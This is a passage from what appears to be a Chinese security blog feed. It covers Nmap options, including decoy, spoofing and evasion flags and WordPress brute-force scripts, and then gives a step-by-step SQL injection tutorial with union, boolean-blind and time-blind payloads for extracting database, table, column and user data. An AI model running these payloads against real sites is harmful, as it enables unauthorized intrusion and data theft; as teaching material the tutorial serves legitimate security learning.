该值的’s’（秒），’m’（分钟）或’h’（小时）（例如30m）。<br>  -T &lt;0-5&gt;：设置时序模板（越高越快）<br>  –min-hostgroup / max-hostgroup <size>：并行主机扫描组大小<br>  –min-parallelism / max-parallelism <numprobes>：探测并行化<br>  –min-rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定探测往返时间。<br>  –max-retries <tries>：端口扫描探测重传的上限数量。<br>  –host-timeout <time>：在此之后放弃目标<br>  –scan-delay /  -  max-scan-delay <time>：调整探针之间的延迟<br>  –min-rate <number>：发送数据包的速度不低于每秒<number><br>  –max-rate <number>：发送数据包的速度不超过<number>每秒<br>防火墙/ IDS逃脱和防御：<br>  -F; –mtu <val>：分段数据包（可选择w /给定MTU）<br>  -D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵披露扫描<br>  -S <IP_Address>：欺骗源地址<br>  -e <iface>：使用指定的接口<br>  -g /  -  source-port <portnum>：使用给定的端口号<br>  –proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理的中继连接<br>  –data <hex string>：为发送的数据包附加自定义有效负载<br>  –data-string <string>：为发送的数据包附加自定义ASCII字符串<br>  –data-length <num>：将随机数据附加到已发送的数据包<br>  –ip-options <options>：发送带有指定ip选项的数据包<br>  –ttl <val>：设置IP生存时间字段<br>  –spoof-mac &lt;mac address / prefix / vendor name&gt;：欺骗你的MAC地址<br>  –badsum：使用伪TCP / UDP / SCTP校验和发送数据包<br>OUTPUT：<br>  -oN / -oX / -oS / -oG <file>：正常输出扫描，XML，s | &lt;rIpt kIddi3，和Grepable格式，分别为给定的文件名。<br>  -oA <basename>：一次输出三种主要格式<br>  -v：增加详细级别（使用-vv或更高级别以获得更好的效果）<br>  -d：提高调试级别（使用-dd或更多以获得更好的效果）<br>  –reason：显示端口处于特定状态的原因<br>  –open：仅显示打开（或可能打开）的端口<br>  –packet-trace：显示发送和接收的所有数据包<br>  –iflist：打印主机接口和路由（用于调试）<br>  –append-output：附加到而不是clobber指定的输出文件<br>  –resume <filename>：恢复中止扫描<br>  –stylesheet &lt;path / URL&gt;：用于将XML输出转换为HTML的XSL样式表<br>  –webxml：来自Nmap.Org的参考样式表，用于更多可移植的XML<br>  –no-stylesheet：防止与XML输出相关联的XSL样式表<br> <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 常用选项示例</span><br></pre></td></tr></table></figure><br>nmap -sP 192.168.1.100        #查看一个主机是否在线<br>nmap -sV -O 192.168.0.100    #判断目标操作系统类型<br>nmap -p 1-21 192.168.1.100    #扫描指定端口范围<br>nmap -sV 192.168.1.100        #查看目标开放端口对应的协议及版本信息<br>nmap -A T4 192.168.1.1        #常规扫描(常用)</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">### 常用NSE脚本</span><br></pre></td></tr></table></figure>
<p>http-php-version   #获得PHP版本信息<br>Http-enum          #枚举Web站点目录<br>smtp-strangeport   #判断SMTP是否运行在默认端口<br>dns-blacklist      #发现IP地址黑名单<br>#检测WAF<br>nmap -p 80,443 –script=http-waf-detect 192.168.0.100<br>nmap -p 80,443 –script=http-waf-fingerprint <a href="http://www.victom.com" target="_blank" rel="noopener">www.victom.com</a><br>#扫描WordPress<br>1.http-wordpress-plugins<br>2.http-wordpress-enum<br>3.http-wordpress-brute</p>
<p>nmap –script=vuln 192.168.137.*     #扫描常见漏洞<br>```</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2019/12/20/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/1.jpg" class="" title="This is an 1 image">
<a id="more"></a>
<h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p>
<h3 id="SQL的类型"><a href="#SQL的类型" class="headerlink" title="SQL的类型"></a>SQL的类型</h3><h4 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h4><ol>
<li>数字型注入:无需闭合 多为id?=1 and 1=1 –+</li>
<li>字符型注入:需要闭合 多为name=’admin’ and 1=1 #</li>
<li>搜索型注入:主要在数据搜索时没有过滤搜索参数search=’%搜索%’ and ‘%1%’=’%1%’</li>
</ol>
<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul>
<li>基于布尔的盲注:根据页面返回结果判断条件真假注入</li>
<li>基于时间的忙著:根据页面响应时间判断条件真假注入</li>
<li>基于错误的注入:根据页面返回的错误信息查看数据库内容</li>
<li>联合查询注入:可以使用union查询数据库内容</li>
<li>堆查询注入:可以同时执行多条语句</li>
</ul>
<h4 id="按照数据请求方式来分类"><a href="#按照数据请求方式来分类" class="headerlink" title="按照数据请求方式来分类"></a>按照数据请求方式来分类</h4><p>GET注入：HTTP请求方式为get，注入点一般在get传入的参数部分。<br>POST注入：HTTP请求方式为post，注入点一般为提交的HTML表单，即post传入的数据内容。<br>HTTP头注入：HTTP的请求头存在注入点，例如XFF头，cookie，host这些都是常见的注入点。</p>
<h2 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a>MySQL常用的系统函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()                     #MySQL版本</span><br><span class="line">user()                        #数据库用户名</span><br><span class="line">database()                    #数据库名</span><br><span class="line">current_user()                #当前用户名</span><br><span class="line">system_user()                 #系统函数名</span><br><span class="line">session_user()                #连接数据库的用户名</span><br><span class="line">@@datadir                     #数据库路径</span><br><span class="line">@@version_compile_os          #操作系统版本</span><br><span class="line">@@basedir                     #数据库安装路径</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询注入利用的前提条件是有<code>显示位</code><br>显示位就是在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p>
<h3 id="联合注入所用函数"><a href="#联合注入所用函数" class="headerlink" title="联合注入所用函数"></a>联合注入所用函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union           #union操作符用于连接两个以上的select语句的结果组合到一个结果集合中</span><br><span class="line">select          #select语句用于从数据库中选取数据</span><br><span class="line">order by        #order by 关键字默认按升序对结果进行排序</span><br><span class="line">group_concat()  #把括号内的值打印在一行,以逗号分隔,以升序排列</span><br><span class="line">from            #从</span><br><span class="line">where           #有条件地从表中选取数据</span><br></pre></td></tr></table></figure>

<h3 id="information-schema数据库说明"><a href="#information-schema数据库说明" class="headerlink" title="information_schema数据库说明"></a>information_schema数据库说明</h3><p>这是一个信息数据库,其中保存着其他数据库的数据库名，数据库的表名，数据库表里的列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema.SCHEMATA表：提供了当前mysql中数据库的信息。</span><br><span class="line">information_schema.TABLES表：提供了数据库中表的信息。</span><br><span class="line">information_schema.COLUMNS表：提供了表中的列信息。</span><br><span class="line">table_schema:数据库名</span><br><span class="line">table_name:表名</span><br><span class="line">column_name:列名</span><br></pre></td></tr></table></figure>
<h3 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h3><ol>
<li>判断注入点</li>
<li>判断是整型还是字符型</li>
<li>判断查询列数</li>
<li>判断显示位</li>
<li>获取所有数据库名</li>
<li>获取数据库所有表名</li>
<li>获取字段名</li>
<li>获取字段中的数据</li>
</ol>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>例：<a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>可以使用 <code>and 1=1</code> 和<code>and 1=2</code>  根据页面的不同判断（整形判断）</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/2.png" class="" title="This is an 2 image">
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/3.png" class="" title="This is an 3 image">
<p>还可以使用 单引号<code>&#39;</code>判断显示数据库错误信息或者页面回显不同（整形字符串类型的判断） </p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/4.png" class="" title="This is an 4 image">
<h4 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h4><p>输入<code>and 1=1</code>和<code>and 1=2</code>后发现页面变化，判断为整型注入<br>后台代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入&#96;&#39; and 1&#x3D;1 %23&#96;和 &#96;&#39; and 1&#x3D;2%23&#96;后发现页面变化，判断为字符注入</span><br><span class="line">后台代码为：</span><br><span class="line">&#96;&#96;&#96;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<h4 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h4><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数</p>
<p>输入 <code>order by 4%23</code>  发现页面错误，说明没有4列</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/5.png" class="" title="This is an 5 image">
<p>输入3列时，页面正常，说明有3列</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/6.png" class="" title="This is an 6 image">
<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><p>例 <a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 7.png This is an 7 image %&#125;</span><br><span class="line">#### 获取所有数据库名</span><br><span class="line">&#96;&#96;&#96;www.xxx.com&#x2F;view?id&#x3D;-1 union select 1,2,database()</span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/8.png" class="" title="This is an 8 image">
<h4 id="获取数据库所有表名"><a href="#获取数据库所有表名" class="headerlink" title="获取数据库所有表名"></a>获取数据库所有表名</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xxx.com/<span class="keyword">view</span>?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/9.png" class="" title="This is an 9 image">
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xxx.com/<span class="keyword">view</span>?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/10.png" class="" title="This is an 10 image">
<h4 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h4><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">www.xxx.com/view?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">group_concat</span>(<span class="title">username</span>) <span class="title">from</span> 字段名</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/11.png" class="" title="This is an 11 image">
<h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>页面中没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常。</p>
<h3 id="布尔盲注所用函数"><a href="#布尔盲注所用函数" class="headerlink" title="布尔盲注所用函数"></a>布尔盲注所用函数</h3><p>MYSQL的substr函数的使用</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">格式：SUBSTR(<span class="keyword">string</span>,<span class="built_in">start</span>,<span class="built_in">len</span>)</span><br><span class="line">含义：从<span class="keyword">string</span>的<span class="built_in">start</span>位开始截取<span class="built_in">len</span>个字符</span><br></pre></td></tr></table></figure>
<p>MYSQL的ascii函数的使用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">格式：ASCII(<span class="type">char</span>) </span><br><span class="line">含义：将<span class="type">char</span>转化成ascii码</span><br></pre></td></tr></table></figure>
<p>MYSQL的length函数的使用</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">格式：<span class="keyword">length</span>(<span class="keyword">str</span>)</span><br><span class="line">含义：返回<span class="keyword">str</span>字符串的长度</span><br></pre></td></tr></table></figure>
<p>首先要记得常见的ASCII，[A-Z]:[65-90], [a-z]:[97122], [0-9]:[48-57]</p>
<h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><h4 id="猜库"><a href="#猜库" class="headerlink" title="猜库"></a>猜库</h4><h5 id="猜数据库名的长度"><a href="#猜数据库名的长度" class="headerlink" title="猜数据库名的长度"></a>猜数据库名的长度</h5><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">and</span></span> <span class="function"><span class="title"><span class="built_in">length</span></span>(<span class="title">database</span>())=<span class="number">8</span>  --+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜数据库名的第一个字符"><a href="#猜数据库名的第一个字符" class="headerlink" title="猜数据库名的第一个字符"></a>猜数据库名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">115</span> <span class="comment">--+</span></span><br><span class="line">猜数据库名的第二个字符就要把substr(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>)修改</span><br></pre></td></tr></table></figure>
<h4 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h4><h5 id="猜表的数量"><a href="#猜表的数量" class="headerlink" title="猜表的数量"></a>猜表的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> count(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()) = <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表的长度"><a href="#猜表的长度" class="headerlink" title="猜表的长度"></a>猜表的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span> <span class="comment">--+ </span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表名的第一个字符"><a href="#猜表名的第一个字符" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))) =<span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜列"><a href="#猜列" class="headerlink" title="猜列"></a>猜列</h4><h5 id="猜列的数量"><a href="#猜列的数量" class="headerlink" title="猜列的数量"></a>猜列的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span>) =<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">因为已知表名 所以直接查</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的长度"><a href="#猜第一个列名的长度" class="headerlink" title="猜第一个列名的长度"></a>猜第一个列名的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">如果猜第二个列的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的第一个字符"><a href="#猜第一个列名的第一个字符" class="headerlink" title="猜第一个列名的第一个字符"></a>猜第一个列名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)))=<span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">如果猜列名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个列名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据的数量"><a href="#猜数据的数量" class="headerlink" title="猜数据的数量"></a>猜数据的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(列名) <span class="keyword">from</span> 表名)=<span class="number">13</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的长度"><a href="#猜第一个数据的长度" class="headerlink" title="猜第一个数据的长度"></a>猜第一个数据的长度</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((select 列名 <span class="keyword">from</span> 表名 limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">4</span> --+</span><br><span class="line">如果猜第二个数据的长度就替换limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的第一个字符"><a href="#猜第一个数据的第一个字符" class="headerlink" title="猜第一个数据的第一个字符"></a>猜第一个数据的第一个字符</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1)) =68 --+</span><br><span class="line">如果要猜第一个数据的第二个字符就把substr(*,2,1)替换</span><br><span class="line">如果要猜第二个数据的第一个字符就替换limit 1,1</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>页面没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回的页面都一样，但是加入sleep(5)条件后，页面的返回速度明显慢了5秒。</p>
<h3 id="时间盲注所用函数"><a href="#时间盲注所用函数" class="headerlink" title="时间盲注所用函数"></a>时间盲注所用函数</h3><p>MYSQL的substr函数的使用</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">格式：SUBSTR(<span class="keyword">string</span>,<span class="built_in">start</span>,<span class="built_in">len</span>)</span><br><span class="line">含义：从<span class="keyword">string</span>的<span class="built_in">start</span>位开始截取<span class="built_in">len</span>个字符</span><br></pre></td></tr></table></figure>
<p>MYSQL的ascii函数的使用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">格式：ASCII(<span class="type">char</span>) </span><br><span class="line">含义：将<span class="type">char</span>转化成ascii码</span><br></pre></td></tr></table></figure>
<p>MYSQL的length函数的使用</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">格式：<span class="keyword">length</span>(<span class="keyword">str</span>)</span><br><span class="line">含义：返回<span class="keyword">str</span>字符串的长度</span><br></pre></td></tr></table></figure>
<p>首先要记得常见的ASCII，[A-Z]:[65-90], [a-z]:[97122], [0-9]:[48-57]</p>
<h3 id="时间盲注过程"><a href="#时间盲注过程" class="headerlink" title="时间盲注过程"></a>时间盲注过程</h3><h4 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h4><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">and sleep(<span class="number">5</span>) --+</span><br><span class="line">and <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">0</span>,<span class="number">1</span>, sleep(<span class="number">10</span>)) --+</span><br><span class="line">``` </span><br><span class="line">#### 猜库</span><br><span class="line">##### 猜数据库名的长度</span><br><span class="line">```and <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure>
<h5 id="猜数据库名的第一个字符-1"><a href="#猜数据库名的第一个字符-1" class="headerlink" title="猜数据库名的第一个字符"></a>猜数据库名的第一个字符</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br><span class="line">猜数据库名的第二个字符就要把substr(database(),<span class="number">2</span>,<span class="number">1</span>)修改</span><br></pre></td></tr></table></figure>
<h4 id="猜表-1"><a href="#猜表-1" class="headerlink" title="猜表"></a>猜表</h4><h5 id="猜表的数量-1"><a href="#猜表的数量-1" class="headerlink" title="猜表的数量"></a>猜表的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">4</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表的长度-1"><a href="#猜表的长度-1" class="headerlink" title="猜表的长度"></a>猜表的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表名的第一个字符-1"><a href="#猜表名的第一个字符-1" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">101</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜列-1"><a href="#猜列-1" class="headerlink" title="猜列"></a>猜列</h4><h5 id="猜列的数量-1"><a href="#猜列的数量-1" class="headerlink" title="猜列的数量"></a>猜列的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>)=<span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">因为已知表名 所以直接查</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的长度-1"><a href="#猜第一个列名的长度-1" class="headerlink" title="猜第一个列名的长度"></a>猜第一个列名的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜第二个列的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的第一个字符-1"><a href="#猜第一个列名的第一个字符-1" class="headerlink" title="猜第一个列名的第一个字符"></a>猜第一个列名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">105</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">如果猜列名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个列名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜数据-1"><a href="#猜数据-1" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据的数量-1"><a href="#猜数据的数量-1" class="headerlink" title="猜数据的数量"></a>猜数据的数量</h5><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">and if((<span class="name">select</span> count(列名) from 表名)=13,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的长度-1"><a href="#猜第一个数据的长度-1" class="headerlink" title="猜第一个数据的长度"></a>猜第一个数据的长度</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(length(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1))=4,sleep(5),1) --+</span><br><span class="line">如果猜第二个数据的长度就替换limit 1,1</span><br></pre></td></tr></table></figure>
